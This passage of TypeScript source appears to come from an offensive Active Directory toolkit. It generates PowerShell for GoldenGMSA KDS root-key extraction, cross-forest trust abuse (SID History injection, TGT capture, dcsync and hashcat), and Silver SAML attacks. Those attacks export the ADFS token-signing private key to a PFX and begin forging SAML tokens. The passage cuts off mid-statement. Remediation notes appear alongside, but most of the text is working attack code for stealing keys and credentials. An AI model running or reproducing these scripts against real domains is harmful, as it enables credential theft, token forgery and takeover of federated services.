    $keyId = $props['cn'][0]
    Write-Output "--- KDS Root Key: $keyId ---"
    Write-Output "  GUID: $keyId"

    if ($props['mskds-createtime']) {
      $createTime = [DateTime]::FromFileTimeUtc([Int64]::Parse($props['mskds-createtime'][0].ToString()))
      Write-Output "  Created: $createTime"
    }
    if ($props['mskds-usestarttime']) {
      $useStart = [DateTime]::FromFileTimeUtc([Int64]::Parse($props['mskds-usestarttime'][0].ToString()))
      Write-Output "  Effective: $useStart"
      $isActive = $useStart -le (Get-Date).ToUniversalTime()
      Write-Output "  Active: $(if ($isActive) { 'YES' } else { 'NOT YET (future effective date)' })"
    }
    if ($props['mskds-version']) { Write-Output "  Version: $($props['mskds-version'][0])" }
    if ($props['mskds-kdfalgorithmid']) { Write-Output "  KDF Algorithm: $($props['mskds-kdfalgorithmid'][0])" }
    if ($props['mskds-secretagreementalgorithmid']) { Write-Output "  Secret Agreement: $($props['mskds-secretagreementalgorithmid'][0])" }
    if ($props['mskds-privatekeylength']) { Write-Output "  Private Key Length: $($props['mskds-privatekeylength'][0])" }
    if ($props['mskds-publickkeylength']) { Write-Output "  Public Key Length: $($props['mskds-publickeylength'][0])" }

    # Check if root key data is readable
    $hasKeyData = $props['mskds-rootkeydata'] -ne $null
    Write-Output "  Root Key Data Readable: $(if ($hasKeyData) { 'YES [!]' } else { 'NO (insufficient privileges)' })"
    if ($hasKeyData) { Write-Output "  HAS_KEY_DATA=1" }
    Write-Output ""
  }
} catch {
  Write-Output "[-] Error enumerating KDS keys: $_"
  Write-Output "    Requires domain user privileges minimum"
}

# Enumerate gMSA accounts
Write-Output "=== Group Managed Service Accounts ==="
try {
  $gmsaSearcher = New-Object System.DirectoryServices.DirectorySearcher
  $gmsaSearcher.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
  $gmsaSearcher.PropertiesToLoad.AddRange(@('sAMAccountName', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordInterval', 'msDS-GroupMSAMembership', 'servicePrincipalName', 'objectSid', 'userAccountControl', 'description'))
  $gmsas = $gmsaSearcher.FindAll()

  Write-Output "gMSA Accounts Found: $($gmsas.Count)"
  Write-Output "GMSA_COUNT=$($gmsas.Count)"
  Write-Output ""

  foreach ($g in $gmsas) {
    $p = $g.Properties
    $name = $p['samaccountname'][0]
    Write-Output "--- gMSA: $name ---"

    if ($p['objectsid']) {
      $sidBytes = [byte[]]$p['objectsid'][0]
      $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
      Write-Output "  SID: $sidObj"
    }
    if ($p['msds-managedpasswordinterval']) { Write-Output "  Password Interval: $($p['msds-managedpasswordinterval'][0]) days" }
    if ($p['serviceprincipalname']) {
      Write-Output "  SPNs:"
      foreach ($spn in $p['serviceprincipalname']) { Write-Output "    $spn" }
    }
    if ($p['description']) { Write-Output "  Description: $($p['description'][0])" }

    # Parse ManagedPasswordId to find which KDS root key is used
    if ($p['msds-managedpasswordid']) {
      $pwdId = [byte[]]$p['msds-managedpasswordid'][0]
      if ($pwdId.Length -ge 24) {
        # Extract root key GUID from ManagedPasswordId (offset 24, 16 bytes)
        $guidBytes = $pwdId[24..39]
        $rootKeyGuid = [Guid]::new($guidBytes)
        Write-Output "  KDS Root Key GUID: $rootKeyGuid"
        Write-Output "  ROOT_KEY=$rootKeyGuid"
      }
    }
    Write-Output ""
  }
} catch {
  Write-Output "[-] Error enumerating gMSAs: $_"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const kdsCount = r.stdout.match(/KDS_COUNT=(\d+)/)
    const gmsaCount = r.stdout.match(/GMSA_COUNT=(\d+)/)
    const hasKeyData = r.stdout.includes("HAS_KEY_DATA=1")

    if (hasKeyData) {
      findings.push({
        checkId: "WIN-GMSA-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTABLE",
        resource: "ad://kds-root-key",
        title: "KDS root key data readable — GoldenGMSA attack possible",
        details: `KDS root key material is accessible. With this key, gMSA passwords can be computed OFFLINE for any managed service account without DC connectivity. Use --action extract to dump key material.`,
        remediation:
          "Restrict read access to KDS root keys. Only Domain Controllers should have access to msKds-RootKeyData.",
      })
    }

    if (gmsaCount && parseInt(gmsaCount[1]) > 0) {
      findings.push({
        checkId: "WIN-GMSA-002",
        provider: "windows",
        severity: "medium",
        status: "INFO",
        resource: "ad://gmsa",
        title: `${gmsaCount[1]} gMSA accounts found — potential GoldenGMSA targets`,
        details:
          "Group Managed Service Accounts use KDS-derived passwords. If KDS root key is extracted, all gMSA passwords can be computed offline.",
        remediation: "Monitor KDS root key access, rotate keys periodically.",
      })
    }
  }

  if (action === "extract") {
    const script = `
Write-Output "=== KDS Root Key Extraction ==="
Write-Output ""

$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configDN"

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
${kdsKeyId ? `$searcher.Filter = "(&(objectClass=msKds-ProvRootKey)(cn=${kdsKeyId}))"` : '$searcher.Filter = "(objectClass=msKds-ProvRootKey)"'}
$searcher.PropertiesToLoad.AddRange(@('cn', 'msKds-RootKeyData', 'msKds-KDFAlgorithmID', 'msKds-KDFParam', 'msKds-SecretAgreementAlgorithmID', 'msKds-SecretAgreementParam', 'msKds-PrivateKeyLength', 'msKds-PublicKeyLength', 'msKds-CreateTime', 'msKds-UseStartTime', 'msKds-Version'))
$results = $searcher.FindAll()

foreach ($r in $results) {
  $props = $r.Properties
  $keyId = $props['cn'][0]
  Write-Output "--- Extracting KDS Root Key: $keyId ---"

  $rootKeyData = $props['mskds-rootkeydata']
  if ($rootKeyData) {
    $keyBytes = [byte[]]$rootKeyData[0]
    $keyB64 = [Convert]::ToBase64String($keyBytes)
    Write-Output "  Key Length: $($keyBytes.Length) bytes"
    Write-Output "  Key (Base64): $keyB64"
    Write-Output "  KEY_DATA=$keyB64"
    Write-Output ""

    # Extract KDF parameters
    if ($props['mskds-kdfparam']) {
      $kdfParam = [byte[]]$props['mskds-kdfparam'][0]
      Write-Output "  KDF Param (Base64): $([Convert]::ToBase64String($kdfParam))"
    }
    if ($props['mskds-secretagreementparam']) {
      $saParam = [byte[]]$props['mskds-secretagreementparam'][0]
      Write-Output "  Secret Agreement Param (Base64): $([Convert]::ToBase64String($saParam))"
    }

    Write-Output ""
    Write-Output "[+] Root key extracted successfully"
    Write-Output "[*] Use GoldenGMSA tool to compute gMSA passwords:"
    Write-Output "    GoldenGMSA.exe compute --sid GMSA_SID --kdskey $keyB64"
    Write-Output ""
    Write-Output "[*] Or use Python gMSADumper with extracted key material"
    Write-Output "EXTRACT_STATUS=SUCCESS"
  } else {
    Write-Output "  [-] Cannot read msKds-RootKeyData — insufficient privileges"
    Write-Output "  [*] Required: Domain Admin or equivalent (read access to CN=Master Root Keys)"
    Write-Output "  [*] Alternative: Use gmsa_dump to read msDS-ManagedPassword directly"
    Write-Output "EXTRACT_STATUS=NO_ACCESS"
  }
  Write-Output ""
}

if ($results.Count -eq 0) {
  Write-Output "[-] No KDS root keys found${kdsKeyId ? ` matching ${kdsKeyId}` : ""}"
  Write-Output "EXTRACT_STATUS=NOT_FOUND"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("EXTRACT_STATUS=SUCCESS")) {
      findings.push({
        checkId: "WIN-GMSA-010",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "ad://kds-root-key",
        title: "KDS root key material extracted — offline gMSA password computation possible",
        details:
          "Root key data has been extracted. Use GoldenGMSA.exe or gMSADumper to compute passwords for any gMSA account without DC connectivity.",
        remediation: "Rotate KDS root keys, revoke compromised gMSA accounts, audit key access.",
      })
    }
  }

  if (action === "compute") {
    if (!sid) {
      output.push("ERROR: --sid required for compute action (gMSA account SID)")
      return { output: output.join("\n"), findings }
    }
    output.push("=== gMSA Password Computation ===")
    output.push("")
    output.push("[!] Password computation requires the GoldenGMSA tool or Python implementation")
    output.push("[*] The KDS key derivation uses SP800-108 CTR-HMAC with domain-specific context")
    output.push("")
    output.push("Step 1: Extract KDS root key (if not done)")
    output.push("  winhook golden_gmsa --action extract")
    output.push("")
    output.push("Step 2: Compute gMSA password")
    output.push(`  GoldenGMSA.exe compute --sid ${sid}${kdsKeyId ? ` --kdskey <base64_key>` : ""}`)
    output.push("")
    output.push("Step 3: Use the password")
    output.push(`  # Pass-the-hash with computed NTLM:`)
    output.push(`  winhook overpass_hash --user gMSA_NAME$ --hash <computed_hash>`)
    output.push("")
    output.push("Alternative Python approach:")
    output.push("  python3 gMSADumper.py -d DOMAIN -u USER -p PASS")
    output.push("  # Or with extracted root key:")
    output.push("  python3 GoldenGMSA.py --kds-key <base64> --sid " + sid)
  }

  return { output: output.join("\n"), findings }
}

export async function crossForest(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const targetForest = argVal(args, "--target-forest")
  const vector = argVal(args, "--vector")
  const findings: Finding[] = []
  const output: string[] = ["[*] Inter-Forest Trust Operations...\n"]

  const script = `
${
  action === "enum"
    ? `
Write-Output "[*] Enumerating trust relationships..."

# Get current domain/forest info
try {
    $currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $currentForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    Write-Output "[+] Current Domain: $($currentDomain.Name)"
    Write-Output "[+] Current Forest: $($currentForest.Name)"
    Write-Output "[+] Forest Root: $($currentForest.RootDomain)"
    Write-Output "[+] Forest Functional Level: $($currentForest.ForestMode)"
    Write-Output ""
} catch {
    Write-Output "[!] Cannot get domain/forest info: $_"
    exit 1
}

# Enumerate domain trusts
Write-Output "=== DOMAIN TRUSTS ==="
$domainTrusts = $currentDomain.GetAllTrustRelationships()
foreach ($trust in $domainTrusts) {
    Write-Output "[+] Trust: $($trust.TargetName)"
    Write-Output "    Direction: $($trust.TrustDirection)"
    Write-Output "    Type: $($trust.TrustType)"

    # Check trust attributes via LDAP
    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
    $searcher.Filter = "(&(objectClass=trustedDomain)(name=$($trust.TargetName)))"
    $searcher.PropertiesToLoad.AddRange(@("trustAttributes","trustDirection","trustType","securityIdentifier","flatName"))
    $trustObj = $searcher.FindOne()

    if ($trustObj) {
        $attrs = [int]$trustObj.Properties["trustAttributes"][0]
        $isSIDFiltered = ($attrs -band 0x4) -ne 0  # TRUST_ATTRIBUTE_QUARANTINED_DOMAIN
        $isForestTransitive = ($attrs -band 0x8) -ne 0  # TRUST_ATTRIBUTE_FOREST_TRANSITIVE
        $isPAM = ($attrs -band 0x400) -ne 0  # TRUST_ATTRIBUTE_PIM_TRUST
        $isSelectiveAuth = ($attrs -band 0x20) -ne 0  # TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION

        Write-Output "    Trust Attributes: 0x$($attrs.ToString('X'))"
        Write-Output "    SID Filtering: $isSIDFiltered"
        Write-Output "    Forest Transitive: $isForestTransitive"
        Write-Output "    Selective Auth: $isSelectiveAuth"
        Write-Output "    PAM Trust: $isPAM"

        if (-not $isSIDFiltered) {
            Write-Output "    [!] SID FILTERING DISABLED — SID History injection across trust is possible"
        }
        if ($isPAM) {
            Write-Output "    [!] PAM TRUST — SID filtering is inherently disabled, shadow principals can be created"
        }
        if (-not $isSelectiveAuth) {
            Write-Output "    [!] Non-selective auth — any authenticated user in trusted domain can access resources"
        }
    }
    Write-Output ""
}

# Forest trusts
Write-Output "=== FOREST TRUSTS ==="
$forestTrusts = $currentForest.GetAllTrustRelationships()
foreach ($trust in $forestTrusts) {
    Write-Output "[+] Forest Trust: $($trust.TargetName) — Direction: $($trust.TrustDirection), Type: $($trust.TrustType)"
}
Write-Output ""

# Foreign group memberships (users from other domains in local groups)
Write-Output "=== FOREIGN PRINCIPALS ==="
$foreignSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$foreignSearcher.Filter = "(objectClass=foreignSecurityPrincipal)"
$foreignSearcher.PropertiesToLoad.AddRange(@("cn","name","objectSid"))
$foreignPrincipals = $foreignSearcher.FindAll()
Write-Output "[+] Foreign Security Principals: $($foreignPrincipals.Count)"
foreach ($fp in $foreignPrincipals) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier(([byte[]]$fp.Properties["objectSid"][0]), 0)
    try {
        $account = $sid.Translate([System.Security.Principal.NTAccount]).Value
        Write-Output "    $sid -> $account"
    } catch {
        Write-Output "    $sid -> (cannot resolve — cross-forest account)"
    }
}
Write-Output ""

# Unconstrained delegation across trusts
Write-Output "=== UNCONSTRAINED DELEGATION (Cross-Trust Risk) ==="
$unDelSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$unDelSearcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))"
$unDelSearcher.PropertiesToLoad.AddRange(@("cn","dNSHostName","operatingSystem"))
$unDelResults = $unDelSearcher.FindAll()
if ($unDelResults.Count -gt 0) {
    Write-Output "[!] Non-DC computers with unconstrained delegation: $($unDelResults.Count)"
    Write-Output "    These can capture TGTs from cross-trust authentication!"
    foreach ($c in $unDelResults) {
        Write-Output "    $($c.Properties["cn"][0]) — $($c.Properties["operatingSystem"])"
    }
} else {
    Write-Output "[+] No non-DC unconstrained delegation found"
}
Write-Output ""

# Check for shared credentials (same username across trusts)
Write-Output "=== SHARED CREDENTIAL RISK ==="
Write-Output "[*] Checking for krbtgt hash reuse indicators..."
$krbtgt = [System.DirectoryServices.DirectorySearcher]::new()
$krbtgt.Filter = "(sAMAccountName=krbtgt)"
$krbtgt.PropertiesToLoad.AddRange(@("pwdLastSet"))
$krbtgtResult = $krbtgt.FindOne()
if ($krbtgtResult) {
    $pwdLastSet = [DateTime]::FromFileTime([Int64]$krbtgtResult.Properties["pwdLastSet"][0])
    Write-Output "[+] krbtgt password last set: $pwdLastSet"
    $daysSinceChange = ([DateTime]::Now - $pwdLastSet).Days
    if ($daysSinceChange -gt 365) {
        Write-Output "    [!] krbtgt password is $daysSinceChange days old — golden ticket risk"
    }
}
`
    : `
Write-Output "[*] Cross-forest exploitation..."
${!targetForest ? 'Write-Output "[!] Required: --target-forest FOREST_NAME"; exit 1' : ""}
${!vector ? 'Write-Output "[!] Required: --vector <sidfilter|delegation|foreign_groups|pam|shared_creds>"; exit 1' : ""}

${
  vector === "sidfilter"
    ? `
Write-Output "[*] Checking SID filtering status for ${targetForest}..."
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
$searcher.PropertiesToLoad.AddRange(@("trustAttributes"))
$trust = $searcher.FindOne()
if ($trust) {
    $attrs = [int]$trust.Properties["trustAttributes"][0]
    if (($attrs -band 0x4) -eq 0) {
        Write-Output "[!] SID Filtering DISABLED for ${targetForest}"
        Write-Output "    SID History injection is possible:"
        Write-Output "    1. Compromise a user in the current domain"
        Write-Output "    2. Inject SID of a privileged group from ${targetForest} into SID History"
        Write-Output "    3. Authenticate to ${targetForest} — the injected SID grants access"
        Write-Output ""
        Write-Output "    Use: sid_history --action inject --target USER --sid S-1-5-21-...-512"
    } else {
        Write-Output "[+] SID Filtering is enabled — SID History injection blocked"
        Write-Output "    Check for PAM trust or other bypass vectors"
    }
} else {
    Write-Output "[-] Trust to ${targetForest} not found"
}
`
    : vector === "delegation"
      ? `
Write-Output "[*] Checking unconstrained delegation across trust to ${targetForest}..."
Write-Output "[*] If a server with unconstrained delegation in THIS domain is accessed by"
Write-Output "    a user from ${targetForest}, their TGT will be cached and can be extracted."
Write-Output ""
Write-Output "    Attack chain:"
Write-Output "    1. Identify servers with unconstrained delegation (see enum results)"
Write-Output "    2. Coerce auth from DC or privileged user in ${targetForest}"
Write-Output "       Use: ntlm_coerce --target DC_OF_${targetForest} --listener DELEG_SERVER"
Write-Output "    3. Extract TGT: pass_the_ticket --action list"
Write-Output "    4. Use TGT to access ${targetForest} resources"
`
      : vector === "foreign_groups"
        ? `
Write-Output "[*] Enumerating foreign group memberships for ${targetForest}..."
try {
    $targetContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest", "${targetForest}")
    $targetDomain = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($targetContext).RootDomain

    Write-Output "[+] Connected to ${targetForest}"
    Write-Output "[*] Looking for accounts from our domain in ${targetForest}'s groups..."

    # Search for our domain's SID in foreign security principals
    $currentDomainSid = (New-Object System.Security.Principal.NTAccount($env:USERDOMAIN, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).AccountDomainSid.Value
    $foreignSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://$($targetDomain.Name)"))
    $foreignSearcher.Filter = "(&(objectClass=foreignSecurityPrincipal)(cn=$currentDomainSid*))"
    $foreignResults = $foreignSearcher.FindAll()
    Write-Output "[+] Our domain's principals in ${targetForest}: $($foreignResults.Count)"
    foreach ($fp in $foreignResults) {
        Write-Output "    $($fp.Properties["cn"][0])"
    }
} catch {
    Write-Output "[!] Cannot connect to ${targetForest}: $_"
}
`
        : vector === "pam"
          ? `
Write-Output "[*] Checking for PAM trust with ${targetForest}..."
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(&(objectClass=trustedDomain)(name=${targetForest}))"
$searcher.PropertiesToLoad.AddRange(@("trustAttributes"))
$trust = $searcher.FindOne()
if ($trust) {
    $attrs = [int]$trust.Properties["trustAttributes"][0]
    if ($attrs -band 0x400) {
        Write-Output "[!] PAM TRUST DETECTED with ${targetForest}"
        Write-Output "    SID filtering is inherently disabled in PAM trusts"
        Write-Output "    Shadow principals can be created in the bastion forest"
        Write-Output "    These map to accounts in the production forest"
        Write-Output ""
        Write-Output "    Attack: Create shadow principal → instant access to production forest"
    } else {
        Write-Output "[+] Not a PAM trust — check for other vectors"
    }
} else {
    Write-Output "[-] Trust to ${targetForest} not found"
}
`
          : `
Write-Output "[*] Checking for shared credential patterns with ${targetForest}..."
Write-Output "    If administrators use the same password across forests,"
Write-Output "    a compromised hash from one forest works in the other."
Write-Output ""
Write-Output "    Common patterns:"
Write-Output "    - Same admin account name with same password"
Write-Output "    - Service accounts reused across forests"
Write-Output "    - krbtgt hash reuse (rare but devastating)"
Write-Output ""
Write-Output "    Use dcsync + hashcat to check password reuse across forests"
`
}
`
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (action === "enum") {
    const sidFilterOff = (result.stdout.match(/SID FILTERING DISABLED/g) || []).length
    const pamTrust = (result.stdout.match(/PAM TRUST/g) || []).length
    const unDeleg = result.stdout.match(/unconstrained delegation:\s*(\d+)/)

    if (sidFilterOff > 0) {
      findings.push({
        checkId: "WIN-TRUST-001",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "ad://trusts",
        title: `${sidFilterOff} trust(s) with SID filtering disabled`,
        details: "SID History injection possible across trust boundary",
        remediation: "Enable SID filtering: netdom trust DOMAIN /domain:TARGET /quarantine:yes",
      })
    }
    if (pamTrust > 0) {
      findings.push({
        checkId: "WIN-TRUST-002",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "ad://trusts",
        title: "PAM trust detected — SID filtering inherently disabled",
        details: "Privileged Access Management trust allows shadow principal creation",
        remediation: "Review PAM trust necessity. Audit shadow principal creation events.",
      })
    }
    if (unDeleg && parseInt(unDeleg[1]) > 0) {
      findings.push({
        checkId: "WIN-TRUST-003",
        provider: "windows",
        severity: "high",
        status: "ENUMERATED",
        resource: "ad://delegation",
        title: `${unDeleg[1]} non-DC servers with unconstrained delegation (cross-trust TGT capture risk)`,
        details: "Cross-trust authentication to these servers exposes TGTs for extraction",
        remediation: "Remove unconstrained delegation. Use constrained delegation or RBCD instead.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function silverSaml(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const adfsServer = argVal(args, "--adfs-server")
  const targetUser = argVal(args, "--target-user")
  const audience = argVal(args, "--audience")
  const certPath = argVal(args, "--cert-path")
  const findings: Finding[] = []
  const output: string[] = ["[*] Silver SAML attack operations...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== ADFS / Federation Configuration ==="
Write-Output ""

# Check if ADFS role is installed locally
$adfs = Get-Service adfssrv -ErrorAction SilentlyContinue
if ($adfs) {
  Write-Output "[+] ADFS Service found locally: $($adfs.Status)"
  Write-Output "ADFS_LOCAL=1"
  Write-Output ""

  # ADFS configuration
  try {
    Import-Module ADFS -ErrorAction SilentlyContinue
    $adfsProps = Get-AdfsProperties -ErrorAction SilentlyContinue
    if ($adfsProps) {
      Write-Output "Federation Service Name: $($adfsProps.HostName)"
      Write-Output "Federation Service Identifier: $($adfsProps.Identifier)"
      Write-Output "IdP SSO URL: https://$($adfsProps.HostName)/adfs/ls/"
      Write-Output ""
    }

    # Token-signing certificates
    Write-Output "=== Token-Signing Certificates ==="
    $certs = Get-AdfsCertificate -CertificateType Token-Signing -ErrorAction SilentlyContinue
    foreach ($cert in $certs) {
      Write-Output "  Subject: $($cert.Certificate.Subject)"
      Write-Output "  Thumbprint: $($cert.Thumbprint)"
      Write-Output "  NotAfter: $($cert.Certificate.NotAfter)"
      Write-Output "  IsPrimary: $($cert.IsPrimary)"
      Write-Output "  StoreLocation: $($cert.StoreLocation)"
      Write-Output "  CERT_THUMB=$($cert.Thumbprint)"
      Write-Output ""
    }

    # Relying Party Trusts (targets for forged tokens)
    Write-Output "=== Relying Party Trusts ==="
    $rps = Get-AdfsRelyingPartyTrust -ErrorAction SilentlyContinue
    $rpCount = ($rps | Measure-Object).Count
    Write-Output "Total: $rpCount"
    Write-Output "RP_COUNT=$rpCount"
    Write-Output ""
    foreach ($rp in $rps) {
      Write-Output "  --- $($rp.Name) ---"
      Write-Output "    Identifier: $($rp.Identifier -join ', ')"
      Write-Output "    SamlEndpoint: $($rp.SamlEndpoints | ForEach-Object { $_.Location } | Select-Object -First 1)"
      Write-Output "    Enabled: $($rp.Enabled)"
      Write-Output "    SignatureAlgorithm: $($rp.SignatureAlgorithm)"
      Write-Output "    IssuanceRules: $(if ($rp.IssuanceTransformRules) { 'YES' } else { 'NONE' })"
      Write-Output ""
    }
  } catch {
    Write-Output "[-] Cannot query ADFS config: $_"
    Write-Output "    Need local admin on ADFS server or ADFS management tools"
  }
} else {
  Write-Output "[*] ADFS not installed locally"
  Write-Output "ADFS_LOCAL=0"
}

# Check domain federation configuration via AD
Write-Output ""
Write-Output "=== Domain Federation Settings ==="
try {
  $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  Write-Output "Domain: $($domain.Name)"

  # Check for Azure AD Connect (federation indicator)
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.Filter = "(|(cn=MSOL_*)(cn=AAD_*))"
  $searcher.PropertiesToLoad.AddRange(@('cn', 'description', 'whenCreated'))
  $syncAccounts = $searcher.FindAll()
  if ($syncAccounts.Count -gt 0) {
    Write-Output "[+] Azure AD Connect sync accounts found:"
    foreach ($sa in $syncAccounts) {
      Write-Output "    $($sa.Properties['cn'][0]) — Created: $($sa.Properties['whencreated'][0])"
    }
    Write-Output "AAD_CONNECT=1"
  } else {
    Write-Output "[*] No Azure AD Connect sync accounts found"
    Write-Output "AAD_CONNECT=0"
  }

  # Check for ADFS service accounts
  $searcher.Filter = "(servicePrincipalName=host/sts.*)"
  $adfsAccounts = $searcher.FindAll()
  if ($adfsAccounts.Count -gt 0) {
    Write-Output ""
    Write-Output "[+] ADFS service accounts/servers:"
    foreach ($a in $adfsAccounts) {
      $spns = $a.Properties['serviceprincipalname']
      foreach ($spn in $spns) {
        if ($spn -match 'host/(.+)') { Write-Output "    ADFS Server: $($Matches[1])" }
      }
    }
  }
} catch {
  Write-Output "[-] Domain query failed: $_"
}

# Check for Entra ID federation metadata
${
  adfsServer
    ? `
Write-Output ""
Write-Output "=== Federation Metadata ==="
try {
  $metaUrl = "https://${adfsServer}/FederationMetadata/2007-06/FederationMetadata.xml"
  Write-Output "Fetching: $metaUrl"
  $meta = Invoke-WebRequest -Uri $metaUrl -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
  Write-Output "[+] Federation metadata retrieved ($($meta.Content.Length) bytes)"
  # Extract signing certificate from metadata
  if ($meta.Content -match 'X509Certificate>([^<]+)<') {
    Write-Output "[+] Token-signing certificate found in metadata"
    Write-Output "    (Public portion only — need private key for forgery)"
    Write-Output "META_CERT=1"
  }
} catch {
  Write-Output "[-] Cannot fetch metadata: $_"
}
`
    : ""
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const isLocalAdfs = r.stdout.includes("ADFS_LOCAL=1")
    const rpCount = r.stdout.match(/RP_COUNT=(\d+)/)

    if (isLocalAdfs) {
      findings.push({
        checkId: "WIN-SAML-001",
        provider: "windows",
        severity: "critical",
        status: "ADFS_FOUND",
        resource: "adfs://local",
        title: "ADFS server found — Silver SAML attack possible if signing cert is extracted",
        details: `ADFS is running locally${rpCount ? ` with ${rpCount[1]} relying party trusts` : ""}. Extract the token-signing certificate (private key) to forge SAML assertions for any federated user.`,
        remediation:
          "Restrict ADFS admin access, use HSM for token-signing keys, enable Entra ID certificate rotation.",
      })
    }
  }

  if (action === "extract-cert") {
    const script = `
Write-Output "=== Token-Signing Certificate Extraction ==="
Write-Output ""

# Method 1: ADFS PowerShell module (if on ADFS server)
try {
  Import-Module ADFS -ErrorAction Stop
  $certs = Get-AdfsCertificate -CertificateType Token-Signing

  foreach ($cert in $certs) {
    Write-Output "--- Certificate: $($cert.Thumbprint) ---"
    Write-Output "  Subject: $($cert.Certificate.Subject)"
    Write-Output "  IsPrimary: $($cert.IsPrimary)"
    Write-Output "  HasPrivateKey: $($cert.Certificate.HasPrivateKey)"

    if ($cert.Certificate.HasPrivateKey) {
      Write-Output "  [+] Private key available!"
      Write-Output ""

      # Export as PFX
      $exportPath = "$env:TEMP\\adfs-signing-$($cert.Thumbprint.Substring(0,8)).pfx"
      $exportPass = "CyberStrike$(Get-Random -Minimum 1000 -Maximum 9999)"
      try {
        $pfxBytes = $cert.Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $exportPass)
        [System.IO.File]::WriteAllBytes($exportPath, $pfxBytes)
        Write-Output "  [+] Exported to: $exportPath"
        Write-Output "  [+] Password: $exportPass"
        Write-Output "  EXPORT_PATH=$exportPath"
        Write-Output "  EXPORT_PASS=$exportPass"
        Write-Output "  EXTRACT_STATUS=SUCCESS"
      } catch {
        Write-Output "  [-] Export failed: $_ (key may be non-exportable or in HSM)"
        Write-Output "  [*] Try: mimikatz crypto::certificates /export /store:My"
        Write-Output "  EXTRACT_STATUS=EXPORT_FAILED"
      }
    } else {
      Write-Output "  [-] No private key access"
      Write-Output "  [*] Certificate may be stored in:"
      Write-Output "      - LocalMachine\\My certificate store"
      Write-Output "      - ADFS DKM container in AD"
      Write-Output "      - Hardware Security Module (HSM)"
    }
    Write-Output ""
  }
} catch {
  Write-Output "[-] ADFS module not available: $_"
  Write-Output ""
  Write-Output "[*] Alternative extraction methods:"
  Write-Output ""

  # Method 2: Certificate store directly
  Write-Output "=== Local Certificate Store ==="
  $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('My', 'LocalMachine')
  $store.Open('ReadOnly')
  $signingCerts = $store.Certificates | Where-Object {
    $_.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' } | ForEach-Object {
      $_.Format($false) -match 'Digital Signature'
    }
  }
  foreach ($c in $signingCerts) {
    Write-Output "  Subject: $($c.Subject)"
    Write-Output "  Thumb: $($c.Thumbprint)"
    Write-Output "  HasPrivateKey: $($c.HasPrivateKey)"
    Write-Output "  NotAfter: $($c.NotAfter)"
    Write-Output ""
  }
  $store.Close()

  # Method 3: ADFS DKM (Distributed Key Management) container in AD
  Write-Output "=== ADFS DKM Container ==="
  Write-Output "[*] ADFS stores encryption keys in AD container:"
  Write-Output "    CN=ADFS,CN=Microsoft,CN=Program Data,DC=..."
  Write-Output "[*] Extract with:"
  Write-Output "    ADFSDump.exe (reads DKM key + encrypted PFX from AD)"
  Write-Output "    mimikatz lsadump::dcsync /user:ADFS_SVC (if ADFS uses gMSA)"
  Write-Output "EXTRACT_STATUS=MANUAL_REQUIRED"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    if (r.stdout.includes("EXTRACT_STATUS=SUCCESS")) {
      const exportPath = r.stdout.match(/EXPORT_PATH=(.+)/)
      findings.push({
        checkId: "WIN-SAML-010",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: exportPath ? exportPath[1] : "adfs://signing-cert",
        title: "ADFS token-signing certificate extracted with private key",
        details:
          "Token-signing certificate exported as PFX. This key can forge SAML tokens for ANY federated user, granting access to all relying party trusts (O365, AWS, etc.).",
        remediation:
          "Rotate ADFS signing certificate immediately, revoke current certificate, audit federated access logs.",
      })
    }
  }

  if (action === "forge") {
    if (!certPath) {
      output.push("ERROR: --cert-path required for forge action (path to exported PFX)")
      return { output: output.join("\n"), findings }
    }
    if (!targetUser) {
      output.push("ERROR: --target-user required for forge action")
      return { output: output.join("\n"), findings }
    }
    output.push("=== SAML Token Forgery ===")
    output.push("")
    output.push("[!] SAML token forgery requires compiled tools for proper XML signing")
    output.push("[*] Use one of the following approaches:")
    output.push("")
    output.push("Option 1: ADFSToolkit (PowerShell)")
    output.push(`  New-SAMLToken -Certificate '${certPath}' -User '${targetUser}' \\`)
    output.push(
